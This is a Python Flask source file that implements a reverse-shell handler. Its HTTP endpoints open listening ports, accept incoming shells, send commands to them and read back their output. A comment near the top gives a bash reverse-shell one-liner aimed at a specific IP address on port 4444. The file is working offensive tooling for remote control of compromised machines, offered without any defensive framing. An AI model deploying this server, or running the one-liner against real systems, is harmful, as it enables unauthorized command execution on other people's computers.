import socket
import os 
import sys ,json
from flask import Flask
from signal import SIGTERM # or SIGKILL
#connect bash -i >& /dev/tcp/13.76.188.147/4444 0>&1

# Establishing a socket connection with the client 
global Sockets 
Sockets= []
ConnectSockets = []


import string
from flask import Blueprint, Response, request

ReverseShell = Blueprint('ReverseShell', __name__)



@ReverseShell.route('/openConnection', methods=['POST'])
def openport():
    data = request.form['inputdata']
    print(data)
    data = json.loads(data)
    port = int(data['port'])
    if "timeout" in data and data['timeout'] != None:
        timeout =  int(data['timeout'])
    else: 
        timeout = 10
    global Sockets

    for soc in Sockets: 
        if soc['port'] == port:
            return Response("Error, port is busy ", status=404)
        
    try:

        soc = socket.socket() 
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind(("0.0.0.0",port))
        soc.listen(1)
        soc.settimeout(timeout)
        temp = {
            "port" : port,
            "socket" : soc
        }
        Sockets.append(temp)
        #c,addr = soc.accept()
        return Response("Port open", status=200)
    except Exception as e:
        return Response(str(e), status=404)

@ReverseShell.route('/checkConnect', methods=['GET'])
def check_connect():
    port = int(request.args['id'])
    if "timeout" in request.args:
        timeout =  int(request.args['timeout'])
    else: 
        timeout = 10
    global Sockets
    global  ConnectSockets
    if port not in [soc['port']  for soc in Sockets]:        
        return Response("Error, port is not open ", status=404)
    Soc = ''
    for soc in Sockets: 
        if soc['port'] == port:
            Soc = soc["socket"]
            break
    try:
        if timeout > 100000:
            timeout = None
        Soc.settimeout(timeout)
        
        c,addr = Soc.accept()
        #print(c,addr)
        temp = {
            "port" : port,
            "connect" : c
        }
        ConnectSockets.append(temp)
        return Response("Connect from:" + str(addr), status=200)
    except Exception as e:
        return Response(str(e), status=404)


@ReverseShell.route('/closeConnection', methods=['GET'])
def closeport():
    port = int(request.args['id'])
    global Sockets
    global ConnectSockets
    if port not in [soc['port']  for soc in Sockets]:        
        return Response("Error, port is not open ", status=404)
    Soc = ''
    err = ''
    temp = []
    for con in ConnectSockets:
        if con['port'] == port:
            try:
                con["connect"].close()
            except Exception as e:
                err += "\n" + str(e)
        else: temp.append(con)
    ConnectSockets = temp 

    temp = []
    for soc in Sockets: 
        if soc['port'] == port:
            try:
                soc["socket"].shutdown(socket.SHUT_RDWR) 
                soc["socket"].close()
            except Exception as e:
                err += "\n" + str(e)
        else: temp.append(soc)
    Sockets = temp
    
    return Response("Close port: " + err, status=200)
    

@ReverseShell.route('/send', methods=['GET'])
def send():
    message = request.args['message']
    port = int(request.args['id']) #id ~ port
    global ConnectSockets

    if port not in [con['port']  for con in ConnectSockets]:   
        return Response("Error, connect not open ", status=404)
    Conn = ''
    for con in range(len(ConnectSockets) ):
        if ConnectSockets[con]['port'] == port:
            Conn = con
            break
    try:
        print("send", message, port)
        ConnectSockets[Conn]['connect'].sendall(str.encode(message + "\n"))
        return Response("Send success", status=200)
    except Exception as e:
        return Response(str(e), status=404)

@ReverseShell.route('/receive', methods=['GET'])
def receive():
    if "length" in request.args: 
        length = int(request.args['length'])
    else: 
        length = 4096

    port = int(request.args['id']) #
    global ConnectSockets
    if port not in [con['port']  for con in ConnectSockets]:   
        return Response("Error, connect not open ", status=404)
    Conn = ''
    for con in range(len(ConnectSockets) ):
        if ConnectSockets[con]['port'] == port:
            Conn = con
            break
    try:
        get_resp = ConnectSockets[Conn]['connect'].recv(length)
        # 7-bit and 8-bit C1 ANSI sequences
        import re
        ansi_escape_8bit = re.compile(br'(?:\x1B[@-Z\\-_]|[\x80-\x9A\x9C-\x9F]|(?:\x1B\[|\x9B)[0-?]*[ -/]*[@-~])')
        get_resp = ansi_escape_8bit.sub(b'', get_resp).decode('utf-8')
        return Response(get_resp, status=200)
    
    except Exception as e:
        return Response(str(e), status=404)

def create_app():
    app = Flask(__name__)
    app.register_blueprint(ReverseShell, url_prefix='/')
    return app


if __name__ == '__main__':
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('-p', '--port', default=3001, type=int, help='port to listen on')
    args = parser.parse_args()
    port = args.port
    app = create_app()
    
    app.run(host='0.0.0.0', port=port)